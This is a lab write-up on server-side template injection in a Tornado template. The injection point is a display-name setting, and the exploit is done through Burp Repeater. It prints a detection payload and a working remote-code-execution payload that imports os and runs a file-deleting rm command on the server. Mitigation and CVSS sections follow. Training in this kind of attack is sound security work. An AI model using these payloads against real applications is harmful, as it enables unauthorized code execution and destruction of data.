# Title: Server-Side Template Injection in Code Context (Tornado)

# Description

This application uses a Python Tornado template to display the author name above blog post comments. On the account settings page, users can choose how their name appears — full name, first name, or nickname. The selected option is stored as a parameter called `blog-post-author-display` and its value is embedded directly inside an existing template expression on the page.

Because the input lands inside a template expression that's already open (code context), an attacker doesn't need to introduce template delimiters from scratch. Instead, they can close the existing expression, inject arbitrary template code, and have it evaluated when the comment page loads.

# Steps to Exploit

1. Log in using the credentials `wiener:peter`.
2. Post a comment on any blog post.
3. Go to "My Account" and change the blog post author display name — intercept this POST request in Burp Suite.
4. The request contains the parameter `blog-post-author-display` set to a value like `user.name`.
5. Send this request to Burp Repeater.
6. Modify the parameter value to break out of the existing template expression and inject a test payload:
   ```
   blog-post-author-display=user.name}}{{7*7}}
   ```
7. Forward the request, then navigate to the blog post containing your comment.
8. Observe that the author name now displays as `Peter Wiener49}}` — the `7*7` was evaluated to `49`, confirming SSTI in code context.
9. Now inject a payload that imports Python's `os` module and runs a system command:
   ```
   blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
   ```
10. Forward the request, then reload the blog post page. The template executes, the file is deleted, and the lab is solved.

# Proof of Concept

**Detection Payload:**
```
user.name}}{{7*7}}
```
Result: Author name renders as `Peter Wiener49}}` — confirms expression evaluation.

**Exploit Payload (URL-encoded):**
```
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```

**Decoded exploit:**
```python
user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
```

The `}}` closes the existing template expression. `{% import os %}` uses Tornado's statement block syntax to import Python's os module. `{{os.system('rm /home/carlos/morale.txt')}}` then calls the system command. When the blog page is loaded, the Tornado engine evaluates the injected template code and executes the OS command on the server.

# Impact

• Full Remote Code Execution on the server under the privileges of the web application process.
• An attacker can execute arbitrary Python and OS commands — reading, modifying, or deleting files.
• Sensitive data like database credentials, environment variables, and private keys stored on the server can be exfiltrated.
• The injection point requires a logged-in account, but any regular user can trigger it — it does not require admin privileges.
• The server can be used to establish persistence, pivot to internal services, or disrupt availability entirely.

# Mitigation / Remediation

1. Never embed user-controlled input directly inside template expressions — pass it as a context variable and let the template engine handle it safely.
2. Use auto-escaping features provided by the template engine to prevent injection of control characters.
3. Avoid logic-heavy templates where possible — separate business logic from presentation.
4. Apply the principle of least privilege to the web server process so command execution has limited impact.
5. Review all user-configurable display options to ensure values are validated against a strict allowlist before being stored or used in templates.

# CVSS Score

CVSS v3.1 Score: 8.8 (High)
Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

**CVSS Justification**

Attack Vector: Network (Exploited remotely via Burp Repeater modifying an authenticated POST request)
Attack Complexity: Low (Standard Tornado template syntax — no complex conditions required)
Privileges Required: Low (Requires a regular user account — any logged-in user can exploit this)
User Interaction: None (Attacker triggers execution by loading the blog page — no victim needed)
Scope: Changed (Escapes the web app and impacts the underlying OS)
Confidentiality Impact: High (Can read any file accessible to the server process)
Integrity Impact: High (Can delete or modify files on the server)
Availability Impact: High (Can crash the server or destroy data)
